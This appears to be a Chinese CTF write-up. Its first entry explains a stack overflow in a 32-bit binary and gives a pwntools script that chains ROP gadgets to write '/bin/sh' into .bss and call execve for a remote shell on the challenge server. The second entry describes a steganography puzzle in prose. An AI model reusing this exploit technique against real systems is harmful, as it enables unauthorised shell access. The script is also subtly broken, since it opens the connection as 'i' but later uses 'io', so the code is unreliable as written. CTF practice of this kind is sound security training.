# 0x00



# 0x01 pwn2

> 用ida查看main函数内容，发现可以没有限制向temp读入。
> 查看print函数发现有典型的栈溢出。
> checksec查看保护内容发现栈不能执行，但没有canary。
> 因此，利用栈溢出构造rop链。没有libc，查看elf的gadget，构造系统调用execve，但未找到字符串’/bin/sh’，考虑向已知地址写，于是调用read向bss段写再利用即可。

```python
from pwn import *
i = remote('60.191.205.81', 2017)
# io = process('./250')

# gdb.attach(io,'b *0x08048943')

e = ELF('./250')

plt_read = e.symbols['read']

pad = 0xdeadbeef

g1 = 0x080493a3 # : xor eax, eax ; ret

g2 = 0x080beebd # : [134999741, 135063720]

g3 = 0x0806cbb5 # : int 0x80

g4 = 0x080580d6 # : xor eax, eax ; pop ebx ; ret

g5 = 0x080496d3 # : xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret

g6 = 0x0807a8d5 # : nop ; inc eax ; ret

g7 = 0x08091350 # : xor edx, edx ; div esi ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

g8 = 0x080a6a4d # : xchg eax, edx ; ret

g9 = 0x08050925 # : xor eax, eax ; pop ebx ; pop esi ; pop edi ; ret

p = 'A' * 62 + p32(plt_read) + p32(g9) + p32(0) + p32(e.bss()) + p32(8)
p+= p32(g1) + p32(g5) + p32(e.bss()) + p32(pad)*3 + p32(g8) + p32(g1) + p32(g6)*11 + p32(g3)

print p.encode('hex')

io.sendline(str(len(p)))
io.send(p)
io.send('/bin/sh\x00')

io.interactive()
```

# 0x02 你知道我在等你吗

> 用binwalk尝试，发现分析出一些文件
> 提示.png，扫了一下二维码让我不要关注内容，关注尾部。
> 真正的mp3，查看文件属性的时候发现解压密码。
> 尝试解压coffee.zip成功得到coffee.jpg，看到头部是ff d8，搜索ff d9。
> 尾部是一个png，修复头部信息得到一个二维码扫描后得到一个压缩包解压得到key.txt，尝试base64解密得到flag。
